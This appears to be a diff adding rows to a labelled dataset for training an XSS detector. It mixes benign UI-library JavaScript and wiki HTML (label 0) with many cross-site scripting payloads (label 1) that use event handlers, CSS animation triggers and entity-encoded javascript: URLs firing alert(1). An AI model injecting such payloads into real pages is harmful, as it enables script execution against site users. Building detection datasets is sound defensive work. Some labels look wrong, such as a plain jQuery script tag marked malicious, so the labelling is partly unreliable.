+"<cite ondblclick=""alert(1)"">test</cite>",1
+"<tr onkeydown=""alert(1)"" contenteditable>test</tr>",1
+"<style>:target {transform: rotate(180deg);}</style><wbr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></wbr>",1
+<cite onpointerleave=alert(1)>xss</cite>,1
+const class_name_fade = 'fade' const class_name_show = 'show' const class_dropdown = 'dropdown',0
+"return _this68; } _createclass(formselect, [{",0
+_this3.$headers = _this3.$el.children('li').children('.collapsible-header'),0
+"<canvas draggable=""true"" ondragenter=""alert(1)"">test</canvas>",1
+"<style>:target {color: red;}</style><template id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></template>",1
+"if (modal._count === 1) { document.body.addeventlistener('click', this._handletriggerclick); }",0
+let lastcenter = this.center,0
+"duration: 750, show: function(e, element) { if (e.button === 2) {",0
+<b onpointerover=alert(1)>xss</b>,1
+this.$el.addclass('chips input-field'),0
+"<slot onbeforecopy=""alert(1)"" contenteditable>test</slot>",1
+"useronopenend.call(this.dropdown, this.el)",0
+<center id=x tabindex=1 onbeforeactivate=alert(1)></center>,1
+"<style>@keyframes slidein {}</style><map style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></map>",1
+"<progress onmousedown=""alert(1)"">test</progress>",1
+"<ul><li><a href=""#citerefrussellnorvig2003"">russell &amp; norvig 2003 </a>, p.&#160;957 </li>",0
+<audio controls src=1 onfocusin=alert(1) autofocus>,1
+return this._gettitle() || this._getcontent(),0
+"<noembed onbeforecut=""alert(1)"" contenteditable>test</noembed>",1
+"<label onkeyup=""alert(1)"" contenteditable>test</label>",1
+"if (window_width < 1120) { sha = sha.substring(0, 7); }",0
+"attachevent ( actions.start, handle.children[0], eventstart, { handlenumbers: [index] });",0
+"this.istouchmoving = false; } }, {",0
+"spread = generatespread( density, mode, group ), format = grid.format || { to: math.round",0
+"value: function _handleinputkeydown(e) { autocomplete._keydown = true; var keycode = e.keycode,",0
+_this16.originalheight = 0,0
+this.gotoyear(e.target.value); } gotomonth(month) {,0
+"<video onloadeddata=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
+"<shadow draggable=""true"" ondrag=""alert(1)"">test</shadow>",1
+"}, { key: ""_ondragend"", value: function _ondragend() {",0
+_isshown() { return this.tip && this.tip.classlist.contains(class_name_show); },0
+"easing: 'easeoutcubic', complete: function () { _this15.el.style.display = 'none';",0
+<script src=https://code.jquery.com/jquery-3.5.1.js></script>,1
+"'js/range.js' ], dest: 'temp/js/materialize.js'",0
+"<details onkeydown=""alert(1)"" contenteditable>test</details>",1
+return default$c; } static get defaulttype() {,0
+this.$el.before($(this.wrapper)); this.wrapper.append(this.el); },0
+<title onpointerenter=alert(1)>xss</title>,1
+<ol id=x tabindex=1 onfocus=alert(1)></ol>,1
+"<nav onmouseleave=""alert(1)"">test</nav>",1
+"<address oncut=""alert(1)"" contenteditable>test</address>",1
+"}, []); var referencerect = state.rects.reference; var popperrect = state.rects.popper;",0
+<dfn onpointerover=alert(1)>xss</dfn>,1
+<datalist onpointermove=alert(1)>xss</datalist>,1
+"this.el.removeeventlistener('mouseleave', this._handlemouseleavebound); this.el.removeeventlistener('focus', this._handlefocusbound, true); this.el.removeeventlistener('blur', this._handleblurbound, true);",0
+value: function _handledocumentclickend(e) {,0
+"var date = displaydate.getdate(); this.yeartextel.innerhtml = displaydate.getfullyear(); this.datetextel.innerhtml = day + "", "" + month + "" "" + date;",0
+for (const node of activenodes) { node.classlist.remove(class_name_active) },0
+"<meta name=""generator"" content=""mediawiki 1.35.0-wmf.22""/>",0
+"<ul><li><a href=""/wiki/interpreter_(computing)"" title=""interpreter (computing)"">interpreter </a> </li>",0
+") .appendto(confirmationbtnscontainer) .on('click', this.done.bind(this));",0
+<summary onpointerup=alert(1)>xss</summary>,1
+toastplacement.classname = `${toastplacement.dataset.originalclass} ${this.value}`,0
+"<li id=""cite_note-autogenerated2-398""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-autogenerated2_398-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-autogenerated2_398-1""><sup><i><b>b </b> </i> </sup> </a>",0
+"<dfn onclick=""alert(1)"">test</dfn>",1
+<svg><audio onload=alert(1)></audio>,1
+this.$activetablink = this.$el .children('li.tab') .children('a'),0
+"<video onmouseup=""alert(1)"">test</video>",1
+toggleenabled() { this._isenabled = !this._isenabled },0
+.first(); } if (this.$activetablink.length === 0) {,0
+"<summary oncontextmenu=""alert(1)"">test</summary>",1
+carousel.getorcreateinstance(carousel); } });,0
+"this.el.addeventlistener('blur', this._handlerangeblurmouseouttouchleavebound); this.el.addeventlistener('mouseout', this._handlerangeblurmouseouttouchleavebound); this.el.addeventlistener('touchleave', this._handlerangeblurmouseouttouchleavebound);",0
+rect.height = element.clientheight,0
+this.pause(); this._issliding = true; this._setactiveindicatorelement(nextelementindex);,0
+value: function _isvalid(chip) { if (chip.hasownproperty('tag') && chip.tag !== '') { var exists = false;,0
+"_createpopper(tip) { const placement = execute(this._config.placement, [this, tip, this._element]); const attachment = attachmentmap[placement.touppercase()];",0
+this.originel = this.originel[0],0
+"this.options.onclosestart.call(this, $collapsibleli[0])",0
+"<article onclick=""alert(1)"">test</article>",1
+}(); cash.prefixedprop = getprefixedprop; cash.camelcase = camelcase;,0
+"element.setattribute('tabindex', '-1'); this._toggledropdown(element, false); eventhandler.trigger(element, event_hidden, {",0
+this.isopen = false; this.isfixed = this.el.classlist.contains('sidenav-fixed'); this.isdragged = false;,0
+"<bgsound onpaste=""alert(1)"" contenteditable>test</bgsound>",1
+data.toggle(); }); definejqueryplugin(button);,0
+function getaltaxis(axis) {,0
+<bgsound onpointerdown=alert(1)>xss</bgsound>,1
+"<img src=""`<javascript:alert>`('')""",1
+"<dir onkeyup=""alert(1)"" contenteditable>test</dir>",1
+"<div draggable=""true"" contenteditable>drag me</div><source ondragover=alert(1) contenteditable>drop here</source>",1
+"this.el.removeeventlistener('mouseenter', this._handleopenbound)",0
+let $collapsible = $header.closest('.collapsible'),0
+}); } _animateout() {,0
+backdrop.classlist.add(class_name_fade),0
+"return; } const activeindicator = selectorengine.findone(selector_active, this._indicatorselement);",0
+}]); return tabs; }(component);,0
+<meter id=x tabindex=1 onbeforeactivate=alert(1)></meter>,1
+"return attributes }, getdataattribute(element, key) {",0
+"'"" class=""datepicker-controls"" role=""heading"" aria-live=""assertive"">',",0
+"<li><a href=""/wiki/ferroelectric_ram"" title=""ferroelectric ram"">fram </a> </li>",0
+toast._draggedtoast = null; } },0
+this.dragtarget.classlist.remove('right-aligned'),0
+"} if (ishtmlelement(offsetparent)) { offsets = getboundingclientrect(offsetparent, true);",0
+"const selector_item_img = '.carousel-item img'; const selector_indicators = '.carousel-indicators'; const selector_data_slide = '[data-bs-slide], [data-bs-slide-to]';",0
+<slot onpointerup=alert(1)>xss</slot>,1
+value: function _setupstyles() {,0
+"<tt oncut=""alert(1)"" contenteditable>test</tt>",1
+"<style>@keyframes x{}</style><slot style=""animation-name:x"" onanimationend=""alert(1)""></slot>",1
+"eventhandler.off(document, event_key$5); } _handlefocusin(event) {",0
+"dispose() { eventhandler.off(this._element, event_key) }",0
+"that.xhighestcompletestep.push(0); } function handlesteppoint ( i, n, that ) {",0
+"<style>@keyframes x{}</style><span style=""animation-name:x"" onanimationend=""alert(1)""></span>",1
+var toastelement = this._createtoast(); toastelement.m_toast = this; this.el = toastelement;,0
+"scalex: [0.8, 1], scaley: [0.8, 1] });",0
+const event_hide$4 = `hide${event_key$4}`; const event_hide_prevented$1 = `hideprevented${event_key$4}`; const event_hidden$4 = `hidden${event_key$4}`;,0
+"eventhandler.on(this._element, event_mouseleave$1, () => this._maybeenablecycle())",0
+"${htmlsnippet.trimstart().replace(/^/gm, ' ').replace(/^ {4}$/gm, '').trimend()}",0
+"<abbr onmouseenter=""alert(1)"">test</abbr>",1
+const modaltitle = examplemodal.queryselector('.modal-title'),0
+this._keysselected[key] = true; } else { delete this._keysselected[key];,0
+"this.originel.addeventlistener('click', this._handleoriginclickbound)",0
+if (typeof event !== 'string' || !element) { return null; },0
+if ( values[handlenumber] !== null && firesetevent ) {,0
+"var offset = this.options.margin + this.options.transitionmovement; var edges = m.checkwithincontainer(document.body, bounding, offset); if (edges.left) {",0
+"} const defaulttype = { endcallback: '(function|null)',",0
+"<frame onmouseout=""alert(1)"">test</frame>",1
+<li id=x tabindex=1 onactivate=alert(1)></li>,1
+"onautocomplete: null, // callback for when autocompleted minlength: 1, // min characters before autocomplete starts sortfunction: function (a, b, inputstring) {",0
+"eventhandler.on(document, clickevent, `[data-bs-dismiss=""${name}""]`, function (event) {",0
+"} return fn.apply(element, [event]) }",0
+<img src=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,1
+} const nextelementindex = this._getitemindex(nextelement); const triggerevent = eventname => {,0
+"this._element.classlist.remove(class_name_show$8); const isanimated = this._element.classlist.contains(class_name_fade$5); this._queuecallback(() => this._destroyelement(), this._element, isanimated);",0
+"};return m; }; $jscomp.polyfill = function (e, r, p, m) {",0
+<b onpointerup=alert(1)>xss</b>,1
+"<strike onkeydown=""alert(1)"" contenteditable>test</strike>",1
+"return null }, remove(element, key) {",0
+<bdo onpointerup=alert(1)>xss</bdo>,1
+"return unique(cash.merge(this, cash(selector, context)))",0
+"left: this.options.dialradius + math.sin(_radian) * _radius - this.options.tickradius + 'px', top: this.options.dialradius - math.cos(_radian) * _radius - this.options.tickradius + 'px' });",0
+"<content oncut=""alert(1)"" contenteditable>test</content>",1
+return domelem.m_formselect; } destroy() {,0
+"if (!this._config.parent) { this._addariaandcollapsedclass(this._triggerarray, this._isshown()); }",0
